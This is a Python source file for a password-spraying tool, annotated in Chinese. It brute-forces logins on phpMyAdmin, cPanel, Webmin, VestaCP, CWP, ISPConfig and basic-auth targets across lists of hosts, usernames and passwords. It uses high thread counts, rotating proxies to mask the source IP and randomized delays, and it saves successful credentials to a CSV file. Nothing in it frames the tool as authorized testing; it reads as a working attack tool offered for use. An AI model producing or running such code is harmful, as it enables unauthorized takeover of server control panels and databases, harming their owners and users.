#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# password_spray.py v4.1 終極滿血版
# 所有原始功能保留 + 進度條永不消失 + log 即時監控 + 2000 線程不卡

import sys, os, csv, time, random, requests, argparse, logging, re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from urllib.parse import urlparse

# ====================== 插件匯入 ======================
from password_spray_plugin import (
    phpmyadmin_plugin, cpanel_plugin, basic_auth_plugin,
    webmin_plugin, vestacp_plugin, ispconfig_plugin, cwp_plugin
)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ====================== 工具函式 ======================
def clean_old_logs(days=7):
    cutoff = datetime.now() - timedelta(days=days)
    for f in os.listdir(LOG_DIR):
        path = os.path.join(LOG_DIR, f)
        if os.path.isfile(path) and datetime.fromtimestamp(os.path.getmtime(path)) < cutoff:
            os.remove(path)

def test_proxy(proxy):
    if not proxy: return True
    try:
        r = requests.get("https://api.ipify.org", proxies={"http":proxy,"https":proxy}, timeout=6)
        return r.status_code == 200
    except:
        return False

def read_failed_log(file_path, default_port=80):
    if not os.path.exists(file_path): return []
    entries = []
    with open(file_path, encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            target = row.get("Target","").strip()
            user   = row.get("Username","").strip()
            pwd    = row.get("Password","").strip()
            if not (target and user and pwd): continue
            if not target.lower().startswith(("http://","https://")):
                target = "http://" + target
            p = urlparse(target)
            port = p.port or (443 if p.scheme=="https" else default_port)
            clean_url = f"{p.scheme}://{p.hostname}"
            entries.append((clean_url, port, user, pwd))
    return entries

# ====================== 通用登入處理 ======================
def process_login(plugin, target, port, username, password, output_file, failed_log, timeout):
    try:
        success, code = False, "N/A"
        if args.plugin == "basic_auth":
            success, code, _ = plugin.attempt_basic_auth(f"http://{target}:{port}" if not target.startswith("http") else target, username, password)
        else:
            success, code, _ = plugin.process_login(target, port, username, password, output_file, failed_log, timeout, 1)
        
        if success:
            logging.info(f"SUCCESS → {target}:{port} | {username}:{password} | Code:{code}")
            with open(output_file, "a", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                if f.tell() == 0:
                    w.writerow(["Target","Port","Username","Password","Code","Time"])
                w.writerow([target, port, username, password, code, datetime.now().strftime("%H:%M:%S")])
        else:
            logging.debug(f"failed → {target}:{port} | {username}:{password}")
        return success
    except Exception as e:
        logging.debug(f"error → {target} | {e}")
        return False

# ====================== 主程式 ======================
def main():
    parser = argparse.ArgumentParser(
        description="Password Spray v4.1 終極滿血版",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="執行時建議加上 -u：python3 -u password_spray.py ...\n"
    )
    parser.add_argument("--target_list")
    parser.add_argument("--username")
    parser.add_argument("--username_list")
    parser.add_argument("--password_list")
    parser.add_argument("--plugin", required=True, choices=["basic_auth","phpmyadmin","cpanel","webmin","vestacp","cwp","ispconfig"])
    parser.add_argument("--output", required=True)
    parser.add_argument("--failed_log")
    parser.add_argument("--retry_failed")
    parser.add_argument("--threads", type=int, default=100)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--min_delay", type=float, default=0.0)
    parser.add_argument("--max_delay", type=float, default=0.0)
    parser.add_argument("--proxy")
    parser.add_argument("--proxy_pool")
    parser.add_argument("--debug", action="store_true")
    global args
    args = parser.parse_args()

    # ==================== 日誌設定 ====================
    log_file = os.path.join(LOG_DIR, f"{args.plugin}_{datetime.now():%Y%m%d_%H%M%S}.log")
    logging.getLogger().handlers.clear()
    logging.getLogger().setLevel(logging.DEBUG if args.debug else logging.INFO)

    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s | %(message)s", "%H:%M:%S"))
    logging.getLogger().addHandler(fh)

    # 低線程時才顯示到終端，高線程完全靜音
    if args.threads <= 80:
        ch = logging.StreamHandler()
        ch.setFormatter(logging.Formatter("%(message)s"))
        logging.getLogger().addHandler(ch)

    logging.info("Password Spray v4.1 啟動")
    clean_old_logs()

    # ==================== 代理 ====================
    pool = []
    if args.proxy_pool and os.path.isfile(args.proxy_pool):
        pool = [l.strip() for l in open(args.proxy_pool) if l.strip() and test_proxy(l.strip())]
    single_proxy = args.proxy if args.proxy and test_proxy(args.proxy) else None
    proxy_ip_cache = {}

    # ==================== 讀取目標 ====================
    if args.retry_failed:
        entries = read_failed_log(args.retry_failed, args.port)
        targets   = list({e[0] for e in entries})
        usernames = list({e[2] for e in entries})
        passwords = list({e[3] for e in entries})
    else:
        if not args.target_list or not args.password_list:
            parser.error("正常模式必須提供 --target_list 和 --password_list")
        targets   = [l.strip() for l in open(args.target_list) if l.strip()]
        passwords = [l.strip() for l in open(args.password_list) if l.strip()]
        if args.username_list:
            usernames = [l.strip() for l in open(args.username_list) if l.strip()]
        elif args.username:
            usernames = [args.username]
        else:
            parser.error("請提供 --username 或 --username_list")

    total_tasks = len(targets) * len(usernames) * len(passwords)
    logging.info(f"總嘗試次數 → {total_tasks:,}")

    # ==================== phpMyAdmin 特殊處理 ====================
    if args.plugin == "phpmyadmin":
        plugin = phpmyadmin_plugin.PhpMyAdminPlugin(threads=args.threads, timeout=args.timeout, debug=args.debug, proxy=single_proxy)
        plugin.run_attack(
            phpmyadmin_user=args.username,
            phpmyadmin_user_list_file=args.username_list,
            phpmyadmin_pass_list_file=args.password_list,
            target_list_file=args.target_list,
            output_file=args.output,
            failed_log=args.failed_log,
            threads=args.threads
        )
        return

    # ==================== 其他插件初始化 ====================
    plugin_map = {
        "basic_auth": basic_auth_plugin.BasicAuthPlugin,
        "cpanel": cpanel_plugin.CPanelBruteForcePlugin,
        "webmin": webmin_plugin.WebminBruteForcePlugin,
        "vestacp": vestacp_plugin.VestaCPBruteForcePlugin,
        "cwp": cwp_plugin.CWPBruteForcePlugin,
        "ispconfig": ispconfig_plugin.ISPConfigBruteForcePlugin,
    }
    plugin = plugin_map[args.plugin](threads=args.threads, timeout=args.timeout, debug=args.debug,
                                     proxy=single_proxy, proxy_pool=pool)

    # ==================== 永不消失的進度條 ====================
    pbar = tqdm(total=total_tasks, desc="Spray", unit="try", colour="cyan",
                mininterval=0.5, dynamic_ncols=True, file=sys.stdout, leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining} | {rate_fmt}]")

    # ==================== 開始狂噴 ====================
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}

        for target in targets:
            for user in usernames:
                for pwd in passwords:
                    if args.max_delay > args.min_delay:
                        time.sleep(random.uniform(args.min_delay, args.max_delay))

                    proxy = random.choice(pool) if pool else single_proxy
                    if proxy and proxy not in proxy_ip_cache:
                        try:
                            ip = requests.get("https://api.ipify.org", proxies={"http":proxy,"https":proxy}, timeout=3).text.strip()
                            proxy_ip_cache[proxy] = ip
                        except:
                            proxy_ip_cache[proxy] = "ERR"

                    future = executor.submit(process_login, plugin, target, args.port, user, pwd,
                                             args.output, args.failed_log or "", args.timeout)
                    futures[future] = (target, user, pwd, proxy or "Direct")

        completed = 0
        for future in as_completed(futures):
            target, user, pwd, proxy = futures[future]
            try:
                future.result()
            except:
                pass
            finally:
                completed += 1
                pbar.update(1)

                # 每 1000 次寫一次進度到 log（不影響終端）
                if completed % 1000 == 0 or completed == total_tasks:
                    rate = pbar.format_dict["rate"] or 0
                    ip   = proxy_ip_cache.get(proxy, "Direct")
                    logging.info(f"PROGRESS → {completed:,}/{total_tasks:,} "
                                 f"({completed/total_tasks:.1%}) | Speed: {rate:,.0f} try/s | IP: {ip}")

    pbar.close()
    logging.info("任務全部完成！")
    print(f"\n完成！中獎結果 → {args.output}")
    print(f"完整日誌 → {log_file}")
    print("即時監控指令：")
    print(f"tail -f {log_file} | grep --color=always -E 'PROGRESS|SUCCESS|$'")

if __name__ == "__main__":
    sys.stdout.reconfigure(line_buffering=True)
    os.environ["PYTHONUNBUFFERED"] = "1"
    main()